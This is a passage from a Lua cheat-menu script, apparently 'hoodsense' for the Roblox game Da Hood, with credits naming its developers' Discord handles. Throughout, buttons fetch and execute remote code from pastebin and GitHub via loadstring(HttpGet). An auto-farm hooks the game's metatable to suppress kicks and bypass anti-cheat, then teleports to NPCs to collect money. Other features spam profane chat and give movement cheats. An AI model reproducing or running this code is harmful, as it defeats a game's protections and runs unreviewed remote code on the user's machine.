    loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
end)
rejoin:AddToolTip("Rejoins Server.")

local hop = Section8:CreateButton("Server hop", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/serverhop.lua'))()
end)
local trash = Section8:CreateButton("Trash Talk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/trash_talk.lua"))()
end)
trash:AddToolTip("Loads Trash Talk. [J]")

local macro = Section8:CreateButton("Fake Macro", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/yMmUUyyE"))()
end)
macro:AddToolTip("Loads Fake Macro. [Z]")

local fly = Section8:CreateButton("Fly", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/fly.lua"))()
end)
fly:AddToolTip("Loads Fly. [X]")

local fullbright = Section8:CreateButton("Full Bright", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/full_bright.lua"))()
end)
fullbright:AddToolTip("Loads Full Bright.")

local nocooldown = Section8:CreateButton("No jump cooldown", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/no-jump-cooldown.lua'))()
end)
nocooldown:AddToolTip("Removes jump cooldown.")

local weightfarm = Section8:CreateButton("Weight Farm", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/weight_farm.lua'))()
end)
weightfarm:AddToolTip("Runs Weight Farm.")

local god = Section9:CreateButton("God Mode", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/godmode.lua'))()
end)
god:AddToolTip("Makes you god mode. [THIS CANT BE STOPPED]")

local reset = Section8:CreateButton("Reset Character", function(reset)
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)
reset:AddToolTip("Resets your character")

local idepomilion = Section8:CreateButton('Sing', function()
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Mam głód pierdolę wszystko","All")
wait(1)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ty stój kiedy idę po milion","All")
wait(1.2)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("jxak znxów coś mi nie wyszło","All")
wait(1.3)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i huj nadal idę po milion","All")
wait(0.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("już nie czekam na przyszłość ","All")
wait(0.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("alxe nie mów nic bo","All")
wait(0.9)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("bo bo idę po milion", "All")
end)

--------------------------------------------------------------------
--------------------------//    FUN   ----------------------------
--------------------------   STUFF  //----------------------------
--------------------------------------------------------------------
local swagfly = Section9:CreateButton("Admin Fly", function ()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/admin_fly.lua'))()
end)
swagfly:AddToolTip("Loads Swag Mode Admin Fly! [X]")

local Juggernaut = Section9:CreateButton("Juggernaut", function()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    
    local Anim = Instance.new("Animation")
    Anim.AnimationId = "rbxassetid://2788838708"
    
    function StopAudio()
        LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
    end
    
    function stop(ID, Key)
        local cor = coroutine.wrap(function()
            wait(LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
            if LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                StopAudio()
            end
        end)
        cor()
    end
    
    function play(ID, STOP, LMAO)
        if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
            local Tool = nil
            if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LMAO == true then
                Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
                LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
            end
            LocalPlayer.Backpack["[Boombox]"].Parent =
                LocalPlayer.Character
            game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
            LocalPlayer.Character["[Boombox]"].RequiresHandle = false
            if LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
                LocalPlayer.Character["[Boombox]"].Handle:Destroy()
            end
            LocalPlayer.Character["[Boombox]"].Parent =
                LocalPlayer.Backpack
            LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
            if Tool ~= true then
                if Tool then
                    Tool.Parent = LocalPlayer.Character
                end
            end
            if STOP == true then
                LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
                local cor = coroutine.wrap(function()
                    repeat wait() until LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                    OriginalKeyUpValue = OriginalKeyUpValue+1
                    stop(ID, OriginalKeyUpValue)
                end)
                cor()
            end
        end
    end
    
    function Tool()
        local Tool = Instance.new("Tool")
        Tool.Name = "Juggernaut"
        Tool.RequiresHandle = false
        Tool.Activated:Connect(function()
            local Character = LocalPlayer.Character
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    
            function rm()
                for i,v in pairs(Character:GetDescendants()) do
                    if v:IsA("BasePart") or v:IsA("MeshPart") then
                        if v.Name ~= "Head" then
                            for i,cav in pairs(v:GetDescendants()) do
                                if cav:IsA("Attachment") then
                                    if cav:FindFirstChild("OriginalPosition") then
                                        cav.OriginalPosition:Destroy()
                                    end
                                end
                            end
                            for i,v in pairs(v:GetChildren()) do
                                if v.Name == "OriginalSize" then
                                    v:Destroy()
                                end
                            end
                            if v:FindFirstChild("AvatarPartScaleType") then
                                v:FindFirstChild("AvatarPartScaleType"):Destroy()
                            end
                        end
                    end
                end
            end
    
            Humanoid:LoadAnimation(Anim):Play()
            play(862491729, true, true)
            wait(0.4)
            rm()
            Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
            wait(0.2)
    
            rm()
            Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
            wait(0.02)
    
            rm()
            Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
            wait(0.02)
    
            rm()
            Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
            wait(0.02)
        end)
        Tool.Parent = LocalPlayer.Backpack
    end
    Tool()
end)
Juggernaut:AddToolTip("Makes you Juggernaut.")

local avatarchanger = Section9:CreateButton("Avatar Modifier", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/facechanger.lua'))()
end)
avatarchanger:AddToolTip("Loads Avatar Modifier. [NOT FE]")

local ben = Section9:CreateButton("Ben Talk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/ben.lua"))()
end)
ben:AddToolTip("Loads Ben Talk. [K]")

local swagfly = Section9:CreateButton("Admin Fly", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/admin_fly.lua'))()
end)
swagfly:AddToolTip("Loads Swag Mode Admin Fly. [X]")


local panic = Section9:CreateButton("Rage quit", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/ragequit.lua'))()
end)
panic:AddToolTip("Why u mad bro?")

local superjump = Section9:CreateButton("Super Jump!", function()
    local  MyStand = "DxskTilIDawn"
    local SuperJumpEnabled = false
    
    getgenv().Toggled = false
    local UIS = game:GetService("UserInputService")
    UIS.InputBegan:connect(function(input,gameProcessed)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            if input.KeyCode == Enum.KeyCode.H then
                if UIS:GetFocusedTextBox() == nil then
                    if getgenv().Toggled == false then
                        getgenv().Toggled = true
                    else
                        getgenv().Toggled = true
                    end;end;end;end;end)
    
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Cookies = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
    local OriginalKeyUpValue = 0
    local Anim = Instance.new("Animation" )
    Anim.AnimationId = "rbxassetid://2788290270"
    local Hover = Instance.new("Animation", game.Workspace)
    Hover.Name = "Hover"
    Hover.AnimationId = "rbxassetid://698251653"
    local LeftPunch = Instance.new("Animation",  game.ReplicatedStorage.ClientAnimations)LeftPunch.Name = "LeftPunch"
    LeftPunch.AnimationId = "rbxassetid://2788308661"
    local LeftAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.LeftPunch)
    local CoreUI = Instance.new("ScreenGui")
    local Humanoid = game.Players.LocalPlayer.Character.Humanoid
    CoreUI.Parent = game.CoreGui
    local SaveLocation = nil
    local RigWalk = nil
    local RigIdle = nil
    local InTimeErase = false
    
    local Pointing = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    Pointing.AnimationId = "rbxassetid://507770453"
    
    local UNMASKKK = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    UNMASKKK.Name = "Unmask"
    UNMASKKK.AnimationId = "rbxassetid://3380629232"
    
    local MASKKK = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    MASKKK.Name = "Mask"
    MASKKK.AnimationId = "rbxassetid://3380627692"
    
    local Poter = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
    Poter.Looped = true
    Poter.Priority = Enum.AnimationPriority.Action
    
    local WalkAnimation = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    WalkAnimation.AnimationId = "rbxassetid://2510198475"
    
    local Idle = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    Idle.AnimationId = "rbxassetid://507766388"
    
    local OldChar = LocalPlayer.Character
    local MaskAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Mask)
    local UnmaskAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Unmask)
    
    function FoV()
        local fov = coroutine.wrap(function()
            local Camera = workspace.Camera
            for i = 1, 20 do
                game.TweenService:Create(Camera, TweenInfo.new(0.5), {FieldOfView = 8*i}):Play()
                wait(0.01)
            end
            for i = 1, 20 do
                game.TweenService:Create(Camera, TweenInfo.new(0.5), {FieldOfView = 160-i*4.5}):Play()
                wait(0.01)
            end
        end)
        fov()
    end
    
    local WalkSpeed = false
    
    local function rm()
        for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v.Name == "OriginalPosition" then
                v:Destroy()
            elseif v.Name == "OriginalSize" then
                v:Destroy()
            elseif v.Name == "AvatarPartScaleType" then
                v:Destroy()
            end
        end
    end
    
    
    function Lighting()
        if game.Lighting:FindFirstChild("ERASE") == nil then
            local sound5 = Instance.new("Sound", CoreUI)
            sound5.Volume = 0.1
            sound5.Name = "ERASE"
            sound5.Looped = true
            sound5.SoundId = "rbxassetid://3167092959"
            sound5:Play()
    
            game.Lighting.Sky.Parent = workspace
            game:GetObjects("rbxassetid://6546113226")[1].Parent=game.Lighting
    
        else
            workspace.Sky.Parent = game.Lighting
            CoreUI:FindFirstChild("ERASE"):Destroy()
            game.Lighting:FindFirstChild("ERASE"):Destroy()
        end
    end
    
    function TimeEraseUI()
        local sound5 = Instance.new("Sound", CoreUI)
        sound5.Volume = 0.1
        sound5.SoundId = "rbxassetid://6546128175"
        sound5:Play()
    
        local Image = Instance.new("ImageLabel", CoreUI)
        Image.Image = "http://www.roblox.com/asset/?id=6546043746"
        Image.BackgroundTransparency = 1
        Image.AnchorPoint = Vector2.new(0.5, 0.5)
        Image.Size = UDim2.fromScale(1, 1)
        Image.Position = UDim2.fromScale(-0.5, 0.5)
        delay(0, function()
            for i = 0, 1, 0.1 do
                Image.Position = UDim2.fromScale(-Image.Position.X.Scale+i, 0.5)
                Image.ImageTransparency = Image.ImageTransparency+i
                wait(.01)
            end
            Image:Destroy()
            sound5:Destroy()
        end)
    end
    
    
    function ModelCharacter()
        if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
            local MODEL = Instance.new("Model", workspace)
            MODEL.Name = LocalPlayer.Name.."StringKOD"
    
            OldChar.Humanoid:UnequipTools()
    
            for i, v in pairs(OldChar:GetChildren()) do 
                if (v:IsA("BasePart")  or v:IsA("MeshPart")) and v.Parent:FindFirstChildOfClass("Humanoid") and v.Name ~= "HumanoidRootPart" then
                    local Part = v:Clone()
                    Part.Parent = MODEL
                    Part.Name = v.Name
                    Part.Material = Enum.Material.ForceField
                    Part.CFrame = v.CFrame
                    Part.Transparency = 0.5 
                    Part.BrickColor = BrickColor.Red()
                    Part.CanCollide = false
                    Part.Anchored = true
                    for i, v  in pairs(Part:GetChildren()) do 
                        if v.ClassName ~= "SpecialMesh" then
                            v:Destroy()
                        end
                    end
                end
            end
            local NewCharacter = game:GetObjects("rbxassetid://6547055500")[1]
            NewCharacter.Parent = MODEL
            NewCharacter.Name = "Idaro"
    
            workspace.Camera.CameraSubject = NewCharacter.Humanoid
            SaveLocation = OldChar.HumanoidRootPart.CFrame
            InTimeErase = true
            NewCharacter.HumanoidRootPart.CFrame = SaveLocation
    
            RigIdle = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(Idle)
            RigIdle.Looped = true
            RigIdle.Priority = Enum.AnimationPriority.Action
            RigWalk = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(WalkAnimation)
            RigWalk.Looped = true
            RigWalk.Priority = Enum.AnimationPriority.Action
            WalkSpeed = true
            RigIdle:Play()
        else
            InTimeErase = false
            WalkSpeed = false
            workspace.Camera.CameraSubject =  OldChar.Humanoid
            OldChar.HumanoidRootPart.CFrame =  workspace:FindFirstChild(LocalPlayer.Name.."StringKOD").Idaro.HumanoidRootPart.CFrame
            workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):Destroy()
        end
    end
    
    function Slide()
        local XD = OldChar.Humanoid:LoadAnimation(Anim)
        XD:Play()
        XD.TimePosition = 0.15
        XD.Looped = false
        XD:AdjustSpeed(1.1)
    end
    
    function AddVelocity(Vel, Char)
        Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity+Vel
    end
    
    local IsJump = false
    
    function Jumping()
        if IsJump == false then
            return false
        else
            return true
        end
    end
    
    local Mouse = LocalPlayer:GetMouse()
    
    local MoveDirection = Vector3.new(0,0,0)
    local WSpped = 0 
    local LeftSpeed = 0
    local UpSpeed = 0
    
    function IdleRigXD()
        if RigIdle and RigWalk.IsPlaying and WSpped == 0 and LeftSpeed == 0 and UpSpeed == 0 then
            RigIdle:Play()
            RigWalk:Stop()
        end
    end
    
    function WalkRigXD()
        if RigWalk and RigIdle.IsPlaying then
            RigIdle:Stop()
            RigWalk:Play()
        end
    end
    
    Mouse.KeyDown:Connect(function(KeyDownXD)
        if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") then
            if KeyDownXD == "w" then
                WSpped = -1
                WalkRigXD()
            elseif KeyDownXD == "a" then
                LeftSpeed = -1
                WalkRigXD()
            elseif KeyDownXD == "d" then
                LeftSpeed = 1
                WalkRigXD()
            elseif KeyDownXD == "s" then
                WSpped = 1
                WalkRigXD()
            end
        end
    end)
    
    Mouse.KeyUp:Connect(function(KeyDownXD)
        if KeyDownXD == "w" then
            WSpped = 0
            IdleRigXD()
        elseif KeyDownXD == "a" then
            LeftSpeed = 0
            IdleRigXD()
        elseif KeyDownXD == "d" then
            LeftSpeed = -0
            IdleRigXD()
        elseif KeyDownXD == "s" then
            WSpped = 0
            IdleRigXD()
        end
    end)
    
    local CD = false
    local uis = game:GetService("UserInputService")
    
    uis.InputBegan:Connect(function(i, XD)
        if i.KeyCode == Enum.KeyCode.H and XD == false then
            if SuperJumpEnabled == false then
                SuperJumpEnabled = true
            elseif SuperJumpEnabled == true then
                SuperJumpEnabled = false
            end
        end
    end)
    
    uis.InputBegan:Connect(function(i, XD)
        if i.KeyCode == Enum.KeyCode.Space and XD == false then
            if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
                if Jumping() == true and not Poter.IsPlaying then
                    AddVelocity(OldChar.HumanoidRootPart.CFrame.LookVector*150, OldChar)
                    IsJump = false
                    Cookies:Stop()
                    CD = true
                    Slide()
                    repeat wait() until workspace:FindPartOnRayWithWhitelist(Ray.new(OldChar.HumanoidRootPart.Position, Vector3.new(0, -4 * OldChar.HumanoidRootPart.Size.y, 0)), { workspace.MAP })
                    CD = false
                end
            else
                workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:ChangeState(3)
            end
        end
    end)
    
    function StopAudio()
        OldChar.LowerTorso.BOOMBOXSOUND:Stop()
    end
    
    function stop(ID, Key)
        local cor = coroutine.wrap(function()
            wait(OldChar.LowerTorso.BOOMBOXSOUND.TimeLength-0)
            if OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                StopAudio()
            end
        end)
        cor()
    end
    
    
    function play(ID, STOP, LMAO)
        if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
            local Tool = nil
            if OldChar:FindFirstChildOfClass("Tool") and LMAO == true then
                Tool = OldChar:FindFirstChildOfClass("Tool")
                OldChar:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
            end
            LocalPlayer.Backpack["[Boombox]"].Parent =
                OldChar
            game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
            OldChar["[Boombox]"].RequiresHandle = false
            if OldChar["[Boombox]"]:FindFirstChild("Handle") then
                OldChar["[Boombox]"].Handle:Destroy()
            end
            OldChar["[Boombox]"].Parent =
                LocalPlayer.Backpack
            LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
            if Tool ~= true then
                if Tool then
                    Tool.Parent = OldChar
                end
            end
            if STOP == true then
                OldChar.LowerTorso:WaitForChild("BOOMBOXSOUND")
                local cor = coroutine.wrap(function()
                    repeat wait() until OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OldChar.LowerTorso.BOOMBOXSOUND.TimeLength > 0
                    OriginalKeyUpValue = OriginalKeyUpValue+1
                    stop(ID, OriginalKeyUpValue)
                end)
                cor()
            end
        end
    end
    
    local bro = false
    local TimeErase, CanCel = "Time erase!", "Time erase!"
    local TimeStop, TimeResume = "Time stop!", "Time stop!"
    local XD = false
    LocalPlayer.Chatted:Connect(function(MSG)
        if MSG == "Rage!" then
    if Humanoid:FindFirstChild("HeadScale") then
        rm()
        wait(0.6)
    
        Humanoid:FindFirstChild("HeadScale"):Destroy()
        wait(0.6)
    end
    
    
    if Humanoid:FindFirstChild("BodyWidthScale") then
        rm()
        wait(0.6)
        Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
        wait(0.6)
    end
    
    
    
    if Humanoid:FindFirstChild("BodyDepthScale") then
        rm()
        wait(0.6)
        Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
        wait(0.6)
    end
    
    
    
    if Humanoid:FindFirstChild("BodyTypeScale") then
        rm()
        wait(0.6)
        Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
       wait(0.6)
    end
        elseif MSG:sub(1, 11) == TimeErase and XD == false and not Poter.IsPlaying then
            XDDDD(XD)
        elseif MSG == CanCel and XD == true and not Poter.IsPlaying then
            XDDDD(XD)
        elseif MSG == TimeStop then
            play(6947054675, true, true)
            wait(0.3)
            OldChar.LowerTorso.BOOMBOXSOUND.SoundId = "http://www.roblox.com/asset/?id=wd"
            wait(0.1)
            play(7084712646, true, true)
        end
    end)
    
    function XDDDD(XDR)
        if XDR == false then
            XD = true
            play(6546133414, true, true)
            wait(2)
            TimeEraseUI()
            FoV()
            Lighting()
            ModelCharacter()
        else
            XD = false
            InTimeErase = false
            wait(0.1)
            play(6543435253, true, true)
            TimeEraseUI()
            ModelCharacter()
            Lighting()
            FoV()
    end
    end
    
    function Jump(...)
        (...).Jumping:Connect(function()
            if SuperJumpEnabled == true then
            if CD == false and not Poter.IsPlaying then
                CD = true
                delay(1, function()
                    CD = false
                end)
                Cookies:Play(0, 1, 1.4)
                AddVelocity(OldChar.HumanoidRootPart.CFrame.UpVector*120, OldChar)
                delay(0, function()
                    IsJump = true
                    wait(1) 
                    if IsJump == true then
                        IsJump = false
                    end
                end)
                end
            end
        end)
    end
    
    
    Jump(OldChar.Humanoid)
    
    LocalPlayer.CharacterAdded:Connect(function(Character)
        wait(1)
        if Character.Name == LocalPlayer.Name then
            Jump(Character.Humanoid)
            Poter = Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
            Poter.Looped = true
            Poter.Priority = Enum.AnimationPriority.Action
    
            Cookies = Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
            OldChar = Character
        end
    end)
    
    game["Run Service"].Heartbeat:Connect(function()
        if InTimeErase then
            for i, v in pairs(OldChar:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CFrame = CFrame.new(math.random(200, 500), math.random(200, 500), math.random(200, 500))
                    v.Velocity = Vector3.new(0,0,0)
                end
            end
    
            if OldChar:FindFirstChild("Combat") and XD == true then
                XD = false
                XDDDD(true)
            end
    
            if WalkSpeed == true then
                MoveDirection = Vector3.new(LeftSpeed, UpSpeed, WSpped)
                workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:Move(MoveDirection, true)
            end
        else
            if OldChar:FindFirstChild("[Flashlight]") then
                if workspace.Players:FindFirstChild(MyStand) then
                    if not Poter.IsPlaying then
                        Poter:Play()
                        Poter:AdjustSpeed(0)
                        Poter.TimePosition = 1.2
                    end
                    local lol = workspace.Players:FindFirstChild(MyStand).HumanoidRootPart.CFrame * CFrame.new(0, 0.5, 1.25)
                    OldChar.HumanoidRootPart.CFrame = lol
                end
            else
                if Poter.IsPlaying then
                    Poter:Stop()
                end
            end
        end
    end)	
end)
superjump:AddToolTip("Tip: Type 'Time erase!' in chat to time erase")

local speedboost = Section9:CreateButton("Speed", function()
    plr = game:GetService('Players').LocalPlayer
    down = true
     
    function onButton1Down(mouse)
        down = true
        while down do
            if not down then break end
            local char = plr.Character
            char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 190
            wait()
        end
    end
     
    function onButton1Up(mouse)
        down = false
    end
     
    function onSelected(mouse)
        mouse.KeyDown:connect(function(m) if m:lower()=="c"then onButton1Down(mouse)end end)
        mouse.KeyUp:connect(function(m) if m:lower()=="c"then onButton1Up(mouse)end end)
    end
    onSelected(game.Players.LocalPlayer:GetMouse())
end)
speedboost:AddToolTip("Makes you faster when pressing 'C'")
getgenv().Multiplier = -0.27
local antilock = Section9:CreateButton("Antilock", function()
    local userInput = game:service('UserInputService')
    local runService = game:service('RunService')
    userInput.InputBegan:connect(function(Key)
    if Key.KeyCode == Enum.KeyCode.H then
        Enabled = not Enabled
        if Enabled == true then
            repeat
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getgenv().Multiplier
                runService.Stepped:wait()
            until Enabled == false
        end
    end
end)
end)
antilock:AddToolTip("Enables antilock [H].")

local autofarm = section54:CreateToggle("Auto Farm", nil, function(texto)
	repeat
		wait()
	until game:IsLoaded()
	local gm = getrawmetatable(game)
	setreadonly(gm, false)
	local namecall = gm.__namecall
	gm.__namecall =
		newcclosure(
		function(self, ...)
			local args = {...}
			if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
				if tostring(getcallingscript()) ~= "Framework" then
					return
				end
			end
			if not checkcaller() and getnamecallmethod() == "Kick" then
				return
			end
			return namecall(self, unpack(args))
		end
	)
	
	local LocalPlayer = game:GetService("Players").LocalPlayer
	
	function gettarget()
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
		local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
		local maxdistance = math.huge
		local target
		for i, v in pairs(game:GetService("Workspace").Cashiers:GetChildren()) do
			if v:FindFirstChild("Head") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
				local distance = (HumanoidRootPart.Position - v.Head.Position).magnitude
				if distance < maxdistance then
					target = v
					maxdistance = distance
				end
			end
		end
		return target
	end
	
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Seat") then
			v:Destroy()
		end
	end
	
	shared.MoneyFarm = texto
	
	while shared.MoneyFarm do
		wait()
		local Target = gettarget()
		repeat
			wait()
			pcall(
				function()
					local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
					local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
					local Combat = LocalPlayer.Backpack:FindFirstChild("Combat") or Character:FindFirstChild("Combat")
					if not Combat then
						Character:FindFirstChild("Humanoid").Health = 0
						return
					end
					HumanoidRootPart.CFrame = Target.Head.CFrame * CFrame.new(0, -2.5, 3)
					Combat.Parent = Character
					Combat:Activate()
				end
			)
		until not Target or Target.Humanoid.Health < 0
		for i, v in pairs(game:GetService("Workspace").Ignored.Drop:GetDescendants()) do
			if v:IsA("ClickDetector") and v.Parent and v.Parent.Name:find("Money") then
				local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
				local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
				if (v.Parent.Position - HumanoidRootPart.Position).magnitude <= 18 then
					repeat
						wait()
						fireclickdetector(v)
					until not v or not v.Parent.Parent
				end
			end
		end
		wait(1)
	end
end)
autofarm:CreateKeybind("", function()
end)
autofarm:AddToolTip("Enables Autofarm.")
------------------------
---// CREDITS PAGE ---
local CreditsLabel1 = Section13:CreateLabel("Made with love by hoodsense team!")
CreditsLabel1:UpdateText("Made with love by hoodsense team!")
local discord = Section13:CreateButton("Brought to you by hoodsense.", function(bool)
    setclipboard("pawel#0008 <@804245361894883339> | xdzz#2137 <@935540113369346130> | https://hoodsense.cf/")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Credits Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)

local esko = Section13:CreateButton("Owned by ekso.gq", function(bool)
    setclipboard("https://ekso.gq")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Credits Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)

local CreditsLabel2 = Section13:CreateLabel("© 2022 ekso.gq")
CreditsLabel2:UpdateText("(C) 2022 ekso.gq")
local CreditsLabel3 = Section13:CreateLabel("Staff")
CreditsLabel3:UpdateText("Staff")

local discord1 = Section13:CreateButton("pawel#0008", function(bool)
    setclipboard("pawel#0008 <@804245361894883339>")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Credits Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)
discord1:AddToolTip("Main developer.")

local discord2 = Section13:CreateButton("$ Adxn#0001", function(bool)
    setclipboard("$ Adxn#0001 <@818413928841084938>")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
		print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Credits Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)
discord2:AddToolTip("Staff Member.")

--[[local discord = Section13:CreateButton("! ave#0005", function(bool)
    setclipboard("! ave#0005 <@557671767565664285>")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Credits Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)]]--

local discord3 = Section13:CreateButton("Copy website link.", function(bool)
    setclipboard("http://hoodsense.cf")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
        print("")
        end
    end
    
    local bindableFunction= Instance.new("BindableFunction")
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "hoodsense.cc";
        Text = "Credits Copied on clipboard!";
        Icon = "rbxassetid://8768441000";
        Duration = "BLANK";
        callbakc = bindableFunction;
        Button1 = "Okay!";
    })
end)

local partnerslabel1 = Section10:CreateLabel("Da hood cash services")
partnerslabel1:UpdateText("Da hood cash services")

local partners1 = Section10:CreateButton("discord.gg/azq", function(bool)
    setclipboard("https://discord.gg/azq")
    wait(1)
    local function callback(text)
        if text == "Yes" then
        print("")
        elseif text == "No" then
